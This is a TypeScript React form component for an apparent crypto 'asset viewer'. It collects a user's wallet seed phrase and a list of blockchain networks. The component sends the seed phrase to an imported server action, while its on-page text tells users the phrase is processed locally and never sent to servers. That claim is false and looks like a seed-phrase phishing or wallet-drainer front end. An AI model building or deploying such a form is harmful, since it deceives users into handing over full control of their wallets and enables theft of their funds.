"use client";

import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { Loader2, Check, ChevronsUpDown } from "lucide-react";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormDescription,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Textarea } from "@/components/ui/textarea";
import {
  Command,
  CommandEmpty,
  CommandGroup,
  CommandInput,
  CommandItem,
  CommandList,
} from "@/components/ui/command";
import {
  Popover,
  PopoverContent,
  PopoverTrigger,
} from "@/components/ui/popover";
import { Card, CardContent } from "@/components/ui/card";
import { handleFetchData } from "@/app/actions";
import { useToast } from "@/hooks/use-toast";
import type { WalletData } from "@/app/actions";
import { cn } from "@/lib/utils";
import { Badge } from "@/components/ui/badge";


const networks = [
  { id: "Bitcoin", label: "Bitcoin" },
  { id: "Ethereum", label: "Ethereum" },
  { id: "Solana", label: "Solana" },
  { id: "Polygon", label: "Polygon" },
  { id: "BNB Smart Chain", label: "BNB Smart Chain" },
  { id: "Avalanche", label: "Avalanche" },
  { id: "Cardano", label: "Cardano" },
  { id: "Polkadot", label: "Polkadot" },
  { id: "Litecoin", label: "Litecoin" },
  { id: "Chainlink", label: "Chainlink" },
] as const;


const formSchema = z.object({
  seedPhrase: z
    .string()
    .trim()
    .min(1, "Seed phrase cannot be empty.")
    .refine(
      (phrase) => phrase.split(/\s+/).filter(Boolean).length >= 12,
      "A valid seed phrase must contain at least 12 words."
    ),
  networks: z.array(z.string()).refine((value) => value.length > 0, {
    message: "You have to select at least one network.",
  }),
});

type SeedPhraseFormProps = {
  onDataFetched: (data: WalletData | null) => void;
  onFetchStart: () => void;
};

export function SeedPhraseForm({
  onDataFetched,
  onFetchStart,
}: SeedPhraseFormProps) {
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { toast } = useToast();
   const [popoverOpen, setPopoverOpen] = useState(false);

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      seedPhrase: "",
      networks: ["Bitcoin", "Ethereum", "Solana"],
    },
  });

  async function onSubmit(values: z.infer<typeof formSchema>) {
    setIsSubmitting(true);
    onFetchStart();

    const formData = new FormData();
    formData.append("seedPhrase", values.seedPhrase);
    values.networks.forEach(network => {
        formData.append("networks", network);
    });

    const result = await handleFetchData(formData);

    setIsSubmitting(false);

    if (result.success && result.data) {
      onDataFetched(result.data);
    } else {
      toast({
        variant: "destructive",
        title: "Failed to fetch data",
        description:
          result.error ||
          "An unknown error occurred. Please try again later.",
      });
      onDataFetched(null);
    }
  }

  return (
    <Card>
      <CardContent className="p-6">
        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
            <FormField
              control={form.control}
              name="seedPhrase"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Seed Phrase</FormLabel>
                  <FormControl>
                    <Textarea
                      placeholder="Enter your 12, 18, or 24-word seed phrase here..."
                      className="resize-none"
                      rows={3}
                      {...field}
                    />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />

            <FormField
              control={form.control}
              name="networks"
              render={({ field }) => (
                <FormItem className="flex flex-col">
                  <FormLabel>Blockchain Networks</FormLabel>
                   <Popover open={popoverOpen} onOpenChange={setPopoverOpen}>
                    <PopoverTrigger asChild>
                      <FormControl>
                        <Button
                          variant="outline"
                          role="combobox"
                          className={cn(
                            "w-full justify-between",
                            !field.value && "text-muted-foreground"
                          )}
                        >
                          <div className="flex gap-1 flex-wrap">
                            {field.value.length > 0 ? (
                                field.value.map((net) => (
                                    <Badge variant="secondary" key={net}>{net}</Badge>
                                ))
                            ) : (
                                "Select networks"
                            )}
                          </div>
                          <ChevronsUpDown className="ml-2 h-4 w-4 shrink-0 opacity-50" />
                        </Button>
                      </FormControl>
                    </PopoverTrigger>
                    <PopoverContent className="w-[--radix-popover-trigger-width] p-0">
                       <Command>
                        <CommandInput placeholder="Search networks..." />
                        <CommandList>
                            <CommandEmpty>No network found.</CommandEmpty>
                            <CommandGroup>
                            {networks.map((item) => (
                                <CommandItem
                                    key={item.id}
                                    onSelect={() => {
                                        const currentValue = field.value || [];
                                        const isSelected = currentValue.includes(item.id);
                                        const newValue = isSelected
                                        ? currentValue.filter((id) => id !== item.id)
                                        : [...currentValue, item.id];
                                        field.onChange(newValue);
                                    }}
                                    >
                                    <Check
                                        className={cn(
                                        "mr-2 h-4 w-4",
                                        (field.value || []).includes(item.id)
                                            ? "opacity-100"
                                            : "opacity-0"
                                        )}
                                    />
                                    {item.label}
                                    </CommandItem>
                                ))}
                            </CommandGroup>
                        </CommandList>
                       </Command>
                    </PopoverContent>
                  </Popover>
                  <FormDescription>
                    Select the networks to check for assets.
                  </FormDescription>
                  <FormMessage />
                </FormItem>
              )}
            />
            
            <FormDescription className="pt-4">
                Your seed phrase is processed locally in your browser and is never sent to our servers.
            </FormDescription>


            <Button
              type="submit"
              disabled={isSubmitting}
              className="w-full bg-accent hover:bg-accent/90"
            >
              {isSubmitting ? (
                <>
                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                  Fetching Assets...
                </>
              ) : (
                "View My Assets"
              )}
            </Button>
          </form>
        </Form>
      </CardContent>
    </Card>
  );
}
